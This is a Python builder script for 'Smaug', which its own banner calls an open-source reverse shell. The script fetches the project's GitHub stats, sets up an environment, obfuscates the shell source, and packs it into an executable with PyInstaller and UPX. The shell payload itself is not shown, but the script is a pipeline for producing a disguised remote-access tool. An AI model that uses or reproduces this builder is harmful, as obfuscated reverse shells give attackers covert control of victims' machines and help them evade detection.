import sys
import click
import logging
import pyfiglet
import requests
import fileinput
from colorama import Fore
from rich.console import Console
from rich.logging import RichHandler

from util.build import Build
from util.makeenv import MakeEnv
from util.obfuscate import DoObfuscate

def main():
    stars = requests.get(
        f"https://api.github.com/repos/maxi-schaefer/smaug-reverse-shell").json()["stargazers_count"]
    forks = requests.get(
        f"https://api.github.com/repos/maxi-schaefer/smaug-reverse-shell").json()["forks_count"]

    logging.basicConfig(
        level="NOTSET",
        format="%(message)s",
        datefmt="[%X]",
        handlers=[RichHandler(rich_tracebacks=True,
                              tracebacks_suppress=[click])]
    )

    logging.getLogger("rich")
    console = Console()

    console.print("\n")
    console.print(pyfiglet.figlet_format("Smaug Builder", font="graffiti"),
                  justify="center", highlight=False, style="bold red", overflow="ignore")
    console.print(f"Easy to use and open-source reverse shell.\nStars: {stars} | Forks: {forks}",
                  justify="center", highlight=False, style="bold red", overflow="ignore")

    make_env = MakeEnv()
    make_env.make_env()
    make_env.get_src()

    do_obfuscate = DoObfuscate()
    do_obfuscate.run()

    build = Build()
    build.get_pyinstaller()
    build.get_upx()
    build.build()

if __name__ == "__main__":
    main()